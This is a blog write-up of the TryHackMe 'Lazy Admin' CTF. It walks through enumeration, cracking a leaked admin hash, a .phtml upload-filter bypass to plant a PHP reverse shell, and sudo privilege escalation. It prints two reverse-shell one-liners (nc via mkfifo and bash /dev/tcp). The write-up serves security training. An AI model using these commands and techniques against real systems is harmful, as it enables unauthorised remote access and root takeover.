---
layout: post
title: Lazy Admin
date:   2025-09-10 11:07
description: TryHackMe Lazy Admin CTF Write-Up
tags: tryhackme
comments: false
---

#LAZY ADMIN WRITEUP 






We start off running an Nmap scan to enumerate the open ports

>nmap -sCV x.x.x.x

We can see that ports 22 & 80 are open in the nmap scan below

![img]({{ '/assets/images/1-lazyadmin.png' | relative_url }}){: .center-image }



Navigating to the webpage shows us a basic apache webserver page
Lets enumerated directories and subdirectories with [dirb](https://www.kali.org/tools/dirb/)

> dirb http://x.x.x.x


We can see in the screenshot below that there are a few directories of interest


![img]({{ '/assets/images/2-lazyadmin.png' | relative_url }}){: .center-image }


Navigating to "/content" show us that this site is running CMS sweetRice and not fully developed
Lets see if there are any obvious vulnerabilities that have not yet been patched


![img]({{ '/assets/images/3-lazyadmin.png' | relative_url }}){: .center-image }


Moving further into the directory into the "/content/as" page shows us that there is a login page



![img]({{ '/assets/images/4-lazyadmin.png' | relative_url }}){: .center-image }


I tested different credentials as well as a sqli injection login bypass, but did not have any success
I also found a "sweetrice" file upload vulnerability that may be possible, but this also failed for me

Going back to our directory scan, lets inspected alternate web pages that were enumerated

Navigating to "/content/inc" we find a directory list and site map
We show ~30 different files and direrectories here, but one caught my eye... 
mysql_backup/


![img]({{ '/assets/images/5-lazyadmin.png' | relative_url }}){: .center-image }




![img]({{ '/assets/images/6-lazyadmin.png' | relative_url }}){: .center-image }

Lets download this file and inspect it ...


![img]({{ '/assets/images/7-lazyadmin.png' | relative_url }}){: .center-image }


Looking at this file we can see that it shows us an admin username and hashed password




![img]({{ '/assets/images/8-lazyadmin.png' | relative_url }}){: .center-image }


>manager
>42f749ade7f9e195bf475f37a44cafcb 


Lets try to crack this hash first with an online crack tool
Using [hashes.com](https://hashes.com/en/decrypt/hash)
We are able to crack the hash easily



![img]({{ '/assets/images/9-lazyadmin.png' | relative_url }}){: .center-image }



Let's try to Login with the new credentials at the login page...
>Account: manager
>Password: [cracked hashed password]


![img]({{ '/assets/images/10-lazyadmin.png' | relative_url }}){: .center-image }

SUCCESS !

looking around this page for potential vulnerabilites,
We can see there is the option to upload files in the "MEDIA CENTER" page


![img]({{ '/assets/images/11-lazyadmin.png' | relative_url }}){: .center-image }


Lets try and upload a known malicious file...
I tried to upload the php reverse shell from [pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell)
Not forgetting to modify the IP and port to point to your machine and listener
This hoever failed and did not upload successfully 
We can see that there is a filter in place preventing our upload
Let's try and modify the request and see if we can bypass the filter
.........................................
Using [Burpsuite](https://portswigger.net/burp/communitydownload)
Lets reload and capture the page in order to modify the request
Let's try to change the request from .php to .phtml and forward the request


![img]({{ '/assets/images/12-lazyadmin.png' | relative_url }}){: .center-image }

We can see that this was succfully uploaded and bypassed the filter


![img]({{ '/assets/images/13-lazyadmin.png' | relative_url }}){: .center-image }

Lets start our listner and navigate to the reverse shell we just uploaded by clicking the link
WE now get a successful shell on our machine to the target machine
Lets move into the /home directory and capture our root flag



![img]({{ '/assets/images/14-lazyadmin.png' | relative_url }}){: .center-image }

> Flag: THM{redacted}


_________________

We now got the User Flag !!!

Lets try and escalate our privilege to get the root flag...


>sudo -l 

Running the command above shows that itguy can run a perl script called 'backup.pl' as root
It appears to executes a bash script named '/etc/copy.sh'
Looking inside we see there is a  file which shows a script being run


![img]({{ '/assets/images/15-lazyadmin.png' | relative_url }}){: .center-image }

>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.190 5554 >/tmp/f


Lets modify it to point to our IP and port of our listener 

> echo "bash -i >& /dev/tcp/attacker_ip/port 0>&1" > copy.sh


*Remember we are already connected on the port we originally chose...
*So we will need to start a second listener and a different port from the first listener we set up


![img]({{ '/assets/images/16-lazyadmin.png' | relative_url }}){: .center-image }

Lets run the command below to start the script


>$sudo /usr/bin/perl /home/itguy/backup.pl


We now get our reverse shell as root !!!
Lets cat out /root/root.txt to capture the ROOT FLAG



![img]({{ '/assets/images/17-lazyadmin.png' | relative_url }}){: .center-image }

We have now captured the root flag and pwnd the machine














